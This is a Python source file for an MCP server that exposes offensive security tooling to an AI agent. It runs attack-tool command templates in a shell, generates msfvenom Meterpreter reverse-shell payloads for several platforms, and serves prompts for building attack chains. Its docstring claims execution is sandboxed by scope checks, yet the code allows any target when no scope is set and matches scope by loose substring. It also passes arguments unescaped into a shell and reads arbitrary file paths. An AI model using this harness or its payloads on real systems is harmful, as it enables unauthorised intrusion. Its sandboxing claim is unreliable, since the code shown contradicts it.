"""
Offensive Security MCP Server
Cybermarks Solutions — Daniyal Ahmed

Implements the Model Context Protocol (MCP) over stdio.
Each offensive tool is exposed as an MCP 'tool' that Claude can call.
Execution is sandboxed via scope validation before any command runs.
All executions are audit-logged.
"""

import asyncio
import json
import sys
import os
import subprocess
import shlex
import logging
from datetime import datetime
from pathlib import Path
from typing import Any

# Add parent to path
sys.path.insert(0, str(Path(__file__).parent))
from tools_registry import TOOLS_BY_NAME, TOOLS_REGISTRY, TOOLS_BY_CATEGORY, OffensiveTool

# ── Logging ──────────────────────────────────────────────────────────────────
LOG_DIR = Path(__file__).parent.parent / "logs"
LOG_DIR.mkdir(exist_ok=True)
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [MCP] %(levelname)s %(message)s",
    handlers=[
        logging.FileHandler(LOG_DIR / f"mcp_audit_{datetime.now().strftime('%Y%m%d')}.log"),
        logging.StreamHandler(sys.stderr),
    ]
)
log = logging.getLogger("mcp_server")

# ── MCP Protocol Constants ────────────────────────────────────────────────────
JSONRPC_VERSION = "2.0"
MCP_VERSION = "2024-11-05"
SERVER_NAME = "offensive-security-mcp"
SERVER_VERSION = "2.0.0"


class MCPServer:
    """Minimal MCP server implementing the MCP stdio transport protocol."""

    def __init__(self):
        self.scope: list[str] = []          # allowed target IPs/ranges
        self.engagement_name: str = "default"
        self.output_dir = Path(__file__).parent.parent / "reports"
        self.output_dir.mkdir(exist_ok=True)
        self._handlers = {
            "initialize":           self._handle_initialize,
            "tools/list":           self._handle_tools_list,
            "tools/call":           self._handle_tools_call,
            "resources/list":       self._handle_resources_list,
            "resources/read":       self._handle_resources_read,
            "prompts/list":         self._handle_prompts_list,
            "prompts/get":          self._handle_prompts_get,
        }

    # ── MCP Lifecycle ─────────────────────────────────────────────────────────

    async def _handle_initialize(self, params: dict) -> dict:
        client_info = params.get("clientInfo", {})
        log.info(f"Client connected: {client_info.get('name','unknown')} {client_info.get('version','')}")
        return {
            "protocolVersion": MCP_VERSION,
            "capabilities": {
                "tools": {"listChanged": False},
                "resources": {"subscribe": False, "listChanged": False},
                "prompts": {"listChanged": False},
                "logging": {},
            },
            "serverInfo": {"name": SERVER_NAME, "version": SERVER_VERSION},
        }

    # ── Tools ─────────────────────────────────────────────────────────────────

    async def _handle_tools_list(self, params: dict) -> dict:
        """Return all registered offensive tools as MCP tools."""
        tools = []
        for t in TOOLS_REGISTRY:
            schema = self._build_input_schema(t)
            tools.append({
                "name": t.name,
                "description": (
                    f"[{t.category.upper()}] [{t.platform.upper()}] "
                    f"[RISK:{t.risk_level.upper()}] {t.description}\n"
                    f"Command template: {t.command_template}"
                ),
                "inputSchema": schema,
            })

        # Add special management tools
        tools += [
            {
                "name": "set_scope",
                "description": "Set the engagement scope (allowed targets). MUST be called before running any attack tool.",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "targets": {"type": "array", "items": {"type": "string"}, "description": "List of in-scope IPs, CIDR ranges, or domains"},
                        "engagement_name": {"type": "string", "description": "Name of the engagement"},
                    },
                    "required": ["targets"],
                },
            },
            {
                "name": "get_scope",
                "description": "Get current engagement scope and name.",
                "inputSchema": {"type": "object", "properties": {}},
            },
            {
                "name": "list_tools_by_category",
                "description": "List all tools in a specific category.",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "category": {
                            "type": "string",
                            "enum": list(TOOLS_BY_CATEGORY.keys()),
                            "description": "Tool category to list",
                        }
                    },
                    "required": ["category"],
                },
            },
            {
                "name": "suggest_tools",
                "description": "Get tool recommendations for a given attack phase or technique.",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "phase": {"type": "string", "description": "Attack phase e.g. 'initial recon', 'web exploitation', 'lateral movement', 'privilege escalation'"},
                        "target_type": {"type": "string", "description": "Target type e.g. 'web app', 'windows AD', 'linux server', 'wireless'"},
                    },
                    "required": ["phase"],
                },
            },
            {
                "name": "generate_payload",
                "description": "Generate a reverse shell payload using msfvenom with specified parameters.",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "payload_type": {"type": "string", "enum": ["exe", "elf", "php", "ps1", "aspx", "apk", "jar"], "description": "Payload format"},
                        "lhost": {"type": "string", "description": "Local listener IP address"},
                        "lport": {"type": "integer", "description": "Local listener port"},
                        "encoder": {"type": "string", "description": "Optional encoder e.g. x64/xor_dynamic"},
                        "iterations": {"type": "integer", "description": "Encoding iterations (default 1)"},
                    },
                    "required": ["payload_type", "lhost", "lport"],
                },
            },
            {
                "name": "read_output",
                "description": "Read the output file from a previous tool execution.",
                "inputSchema": {
                    "type": "object",
                    "properties": {
                        "filename": {"type": "string", "description": "Output filename to read"},
                        "lines": {"type": "integer", "description": "Number of lines to read (default 100)"},
                    },
                    "required": ["filename"],
                },
            },
        ]
        return {"tools": tools}

    async def _handle_tools_call(self, params: dict) -> dict:
        """Execute a tool call."""
        tool_name = params.get("name", "")
        args = params.get("arguments", {})

        log.info(f"Tool call: {tool_name} args={json.dumps(args)}")

        try:
            # Special management tools
            if tool_name == "set_scope":
                return await self._tool_set_scope(args)
            if tool_name == "get_scope":
                return await self._tool_get_scope(args)
            if tool_name == "list_tools_by_category":
                return await self._tool_list_by_category(args)
            if tool_name == "suggest_tools":
                return await self._tool_suggest(args)
            if tool_name == "generate_payload":
                return await self._tool_generate_payload(args)
            if tool_name == "read_output":
                return await self._tool_read_output(args)

            # Offensive tool execution
            tool = TOOLS_BY_NAME.get(tool_name)
            if not tool:
                return self._error_result(f"Unknown tool: {tool_name}")

            return await self._execute_tool(tool, args)

        except Exception as e:
            log.error(f"Tool error {tool_name}: {e}", exc_info=True)
            return self._error_result(str(e))

    # ── Scope Management ──────────────────────────────────────────────────────

    async def _tool_set_scope(self, args: dict) -> dict:
        self.scope = args.get("targets", [])
        self.engagement_name = args.get("engagement_name", "default")
        log.info(f"Scope set: {self.scope} engagement={self.engagement_name}")
        return self._text_result(
            f"✓ Scope set for engagement '{self.engagement_name}'\n"
            f"In-scope targets: {', '.join(self.scope)}\n"
            f"Total targets: {len(self.scope)}"
        )

    async def _tool_get_scope(self, args: dict) -> dict:
        if not self.scope:
            return self._text_result("⚠ No scope defined. Call set_scope first.")
        return self._text_result(
            f"Engagement: {self.engagement_name}\n"
            f"In-scope targets ({len(self.scope)}):\n" +
            "\n".join(f"  • {t}" for t in self.scope)
        )

    async def _tool_list_by_category(self, args: dict) -> dict:
        cat = args.get("category", "")
        tools = TOOLS_BY_CATEGORY.get(cat, [])
        if not tools:
            return self._error_result(f"No tools in category: {cat}")
        lines = [f"Tools in [{cat.upper()}] ({len(tools)} tools):\n"]
        for t in tools:
            lines.append(f"  • {t.name} [{t.platform}] [{t.risk_level}] — {t.description}")
        return self._text_result("\n".join(lines))

    async def _tool_suggest(self, args: dict) -> dict:
        phase = args.get("phase", "").lower()
        target_type = args.get("target_type", "").lower()

        suggestions = []

        phase_map = {
            "recon": ["recon", "scanning"],
            "initial": ["recon", "scanning"],
            "web": ["web", "scanning"],
            "exploit": ["exploitation", "web"],
            "lateral": ["post", "windows"],
            "privesc": ["post", "windows"],
            "privilege": ["post", "windows"],
            "password": ["password"],
            "wireless": ["wireless"],
            "c2": ["c2"],
            "post": ["post", "windows"],
        }

        target_map = {
            "windows": ["windows", "password", "post"],
            "ad": ["windows", "password", "post"],
            "active directory": ["windows", "password", "post"],
            "web": ["web", "scanning"],
            "linux": ["post", "recon", "scanning"],
            "wireless": ["wireless"],
        }

        relevant_cats = set()
        for k, cats in phase_map.items():
            if k in phase:
                relevant_cats.update(cats)
        for k, cats in target_map.items():
            if k in target_type:
                relevant_cats.update(cats)

        if not relevant_cats:
            relevant_cats = {"recon", "scanning"}

        for cat in relevant_cats:
            for t in TOOLS_BY_CATEGORY.get(cat, [])[:3]:
                suggestions.append(f"  [{cat.upper()}] {t.name} — {t.description}")

        result = f"Recommended tools for: {phase} / {target_type or 'general'}\n\n"
        result += "\n".join(suggestions) if suggestions else "No specific recommendations found."
        result += "\n\nUse tools/call with the tool name to execute."
        return self._text_result(result)

    # ── Payload Generator ─────────────────────────────────────────────────────

    async def _tool_generate_payload(self, args: dict) -> dict:
        ptype = args.get("payload_type", "exe")
        lhost = args.get("lhost", "")
        lport = args.get("lport", 4444)
        encoder = args.get("encoder", "")
        iterations = args.get("iterations", 1)

        payload_map = {
            "exe": ("windows/x64/meterpreter/reverse_tcp", "exe"),
            "elf": ("linux/x64/meterpreter/reverse_tcp", "elf"),
            "php": ("php/meterpreter/reverse_tcp", "raw"),
            "ps1": ("cmd/windows/reverse_powershell", "raw"),
            "aspx": ("windows/x64/meterpreter/reverse_tcp", "aspx"),
            "apk": ("android/meterpreter/reverse_tcp", "raw"),
            "jar": ("java/meterpreter/reverse_tcp", "jar"),
        }

        payload, fmt = payload_map.get(ptype, ("windows/x64/meterpreter/reverse_tcp", "exe"))
        ext = ptype if ptype != "ps1" else "ps1"
        outfile = self.output_dir.parent / "payloads" / f"payload_{lport}.{ext}"
        outfile.parent.mkdir(exist_ok=True)

        cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f {fmt}"
        if encoder:
            cmd += f" -e {encoder} -i {iterations}"
        cmd += f" -o {outfile}"

        result = await self._run_command(cmd, timeout=60)
        result["generated_file"] = str(outfile)

        log.info(f"Payload generated: {outfile} LHOST={lhost} LPORT={lport}")
        return self._text_result(
            f"Payload generated: {outfile}\n"
            f"Type: {payload}\n"
            f"Format: {fmt}\n"
            f"LHOST: {lhost} LPORT: {lport}\n"
            f"{'Encoder: ' + encoder if encoder else ''}\n\n"
            f"Output:\n{result.get('stdout','')}\n{result.get('stderr','')}"
        )

    # ── Tool Execution ─────────────────────────────────────────────────────────

    async def _execute_tool(self, tool: OffensiveTool, args: dict) -> dict:
        # Scope check for tools with targets
        target_keys = ["target", "url", "domain", "dc", "org"]
        target_value = None
        for k in target_keys:
            if k in args:
                target_value = args[k]
                break

        if target_value and self.scope:
            if not self._in_scope(target_value):
                log.warning(f"SCOPE VIOLATION: {tool.name} against {target_value}")
                return self._error_result(
                    f"⛔ SCOPE VIOLATION: '{target_value}' is not in the defined scope.\n"
                    f"In-scope targets: {', '.join(self.scope)}\n"
                    f"Use set_scope to add this target if it's authorized."
                )

        # Build command from template
        cmd = tool.command_template
        # Fill in args
        for key, val in args.items():
            cmd = cmd.replace(f"{{{key}}}", str(val))

        # Fill in defaults from schema
        for key, default in tool.args_schema.get("optional", {}).items():
            cmd = cmd.replace(f"{{{key}}}", str(default))

        # Set output file if placeholder remains
        output_file = self.output_dir / f"{tool.name}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        cmd = cmd.replace("{output}", str(output_file))

        # Audit log
        log.info(f"EXECUTE [{tool.risk_level.upper()}] {tool.name}: {cmd}")

        result = await self._run_command(cmd, timeout=self._get_timeout(tool))

        output = []
        output.append(f"Tool: {tool.name}")
        output.append(f"Category: {tool.category}")
        output.append(f"Platform: {tool.platform}")
        output.append(f"Risk Level: {tool.risk_level}")
        output.append(f"Command: {cmd}")
        output.append(f"Exit Code: {result['returncode']}")
        output.append(f"Output saved: {output_file}")
        output.append("─" * 60)
        if result["stdout"]:
            output.append("STDOUT:")
            output.append(result["stdout"][:8000])
        if result["stderr"]:
            output.append("STDERR:")
            output.append(result["stderr"][:2000])

        return self._text_result("\n".join(output))

    async def _run_command(self, cmd: str, timeout: int = 120) -> dict:
        """Execute shell command asynchronously with timeout."""
        try:
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                env={**os.environ, "TERM": "xterm"},
            )
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
            return {
                "returncode": proc.returncode,
                "stdout": stdout.decode("utf-8", errors="replace"),
                "stderr": stderr.decode("utf-8", errors="replace"),
            }
        except asyncio.TimeoutError:
            proc.kill()
            return {"returncode": -1, "stdout": "", "stderr": f"Command timed out after {timeout}s"}
        except Exception as e:
            return {"returncode": -1, "stdout": "", "stderr": str(e)}

    # ── Resources ─────────────────────────────────────────────────────────────

    async def _handle_resources_list(self, params: dict) -> dict:
        resources = []
        for f in self.output_dir.glob("*.txt"):
            resources.append({
                "uri": f"file://{f}",
                "name": f.name,
                "mimeType": "text/plain",
            })
        return {"resources": resources}

    async def _handle_resources_read(self, params: dict) -> dict:
        uri = params.get("uri", "")
        path = uri.replace("file://", "")
        try:
            content = Path(path).read_text()[:50000]
            return {"contents": [{"uri": uri, "mimeType": "text/plain", "text": content}]}
        except Exception as e:
            return {"contents": [{"uri": uri, "mimeType": "text/plain", "text": f"Error: {e}"}]}

    async def _tool_read_output(self, args: dict) -> dict:
        filename = args.get("filename", "")
        lines = args.get("lines", 100)
        candidates = list(self.output_dir.glob(f"*{filename}*"))
        if not candidates:
            return self._error_result(f"No output file matching: {filename}")
        path = sorted(candidates)[-1]  # most recent
        content = path.read_text()
        if lines:
            content = "\n".join(content.splitlines()[:lines])
        return self._text_result(f"File: {path.name}\n\n{content}")

    # ── Prompts ────────────────────────────────────────────────────────────────

    async def _handle_prompts_list(self, params: dict) -> dict:
        return {"prompts": [
            {"name": "pentest_methodology", "description": "Full pentest methodology checklist"},
            {"name": "report_finding", "description": "Format a finding for pentest report"},
            {"name": "attack_chain", "description": "Build an attack chain for a given target type"},
        ]}

    async def _handle_prompts_get(self, params: dict) -> dict:
        name = params.get("name", "")
        prompts = {
            "pentest_methodology": "You are an expert penetration tester. Walk through a complete pentest methodology for the given target, recommending specific tools from this MCP server at each phase. Start with passive recon, then active, then exploitation, then post-exploitation.",
            "report_finding": "Format the following finding into a professional pentest report section with: Title, Severity (CVSS), Description, Impact, Evidence, Remediation, References.",
            "attack_chain": "Given the target environment, build a realistic attack chain using the available MCP tools. Show tool-by-tool progression from initial access to objective.",
        }
        msg = prompts.get(name, "Prompt not found")
        return {"description": name, "messages": [{"role": "user", "content": {"type": "text", "text": msg}}]}

    # ── Helpers ────────────────────────────────────────────────────────────────

    def _in_scope(self, target: str) -> bool:
        if not self.scope:
            return True  # no scope = warn-only mode
        import ipaddress
        for s in self.scope:
            if s.lower() in target.lower():
                return True
            try:
                net = ipaddress.ip_network(s, strict=False)
                addr = ipaddress.ip_address(target.split(":")[0])
                if addr in net:
                    return True
            except ValueError:
                pass
        return False

    def _build_input_schema(self, tool: OffensiveTool) -> dict:
        props = {}
        required = tool.args_schema.get("required", [])
        for k in required:
            props[k] = {"type": "string", "description": f"Required: {k}"}
        for k, default in tool.args_schema.get("optional", {}).items():
            props[k] = {"type": "string", "description": f"Optional (default: {default})", "default": str(default)}
        return {"type": "object", "properties": props, "required": required}

    def _get_timeout(self, tool: OffensiveTool) -> int:
        timeouts = {"recon": 300, "scanning": 600, "exploitation": 120, "password": 3600, "wireless": 600, "post": 180, "web": 300, "windows": 180, "c2": 30}
        return timeouts.get(tool.category, 120)

    @staticmethod
    def _text_result(text: str) -> dict:
        return {"content": [{"type": "text", "text": text}]}

    @staticmethod
    def _error_result(msg: str) -> dict:
        return {"content": [{"type": "text", "text": f"ERROR: {msg}"}], "isError": True}

    # ── Main Loop ─────────────────────────────────────────────────────────────

    async def run(self):
        """Run the MCP server on stdio."""
        log.info(f"{SERVER_NAME} v{SERVER_VERSION} started on stdio")
        reader = asyncio.StreamReader()
        protocol = asyncio.StreamReaderProtocol(reader)
        loop = asyncio.get_event_loop()
        await loop.connect_read_pipe(lambda: protocol, sys.stdin.buffer)

        writer_transport, writer_protocol = await loop.connect_write_pipe(
            lambda: asyncio.streams.FlowControlMixin(loop=loop),
            sys.stdout.buffer
        )
        writer = asyncio.StreamWriter(writer_transport, writer_protocol, reader, loop)

        while True:
            try:
                header = await reader.readline()
                if not header:
                    break
                header = header.decode().strip()
                if not header.startswith("Content-Length:"):
                    continue
                content_length = int(header.split(":")[1].strip())
                await reader.readline()  # blank line
                body = await reader.readexactly(content_length)
                request = json.loads(body.decode())

                response = await self._dispatch(request)
                if response:
                    body = json.dumps(response).encode()
                    header_bytes = f"Content-Length: {len(body)}\r\n\r\n".encode()
                    writer.write(header_bytes + body)
                    await writer.drain()

            except asyncio.IncompleteReadError:
                break
            except Exception as e:
                log.error(f"Server error: {e}", exc_info=True)

    async def _dispatch(self, request: dict) -> dict | None:
        method = request.get("method", "")
        params = request.get("params", {})
        req_id = request.get("id")

        # Notifications (no id) — fire and forget
        if req_id is None:
            if method == "notifications/initialized":
                log.info("Client initialized")
            return None

        handler = self._handlers.get(method)
        if not handler:
            return {"jsonrpc": JSONRPC_VERSION, "id": req_id, "error": {"code": -32601, "message": f"Method not found: {method}"}}

        try:
            result = await handler(params)
            return {"jsonrpc": JSONRPC_VERSION, "id": req_id, "result": result}
        except Exception as e:
            log.error(f"Handler error for {method}: {e}", exc_info=True)
            return {"jsonrpc": JSONRPC_VERSION, "id": req_id, "error": {"code": -32000, "message": str(e)}}


if __name__ == "__main__":
    server = MCPServer()
    asyncio.run(server.run())
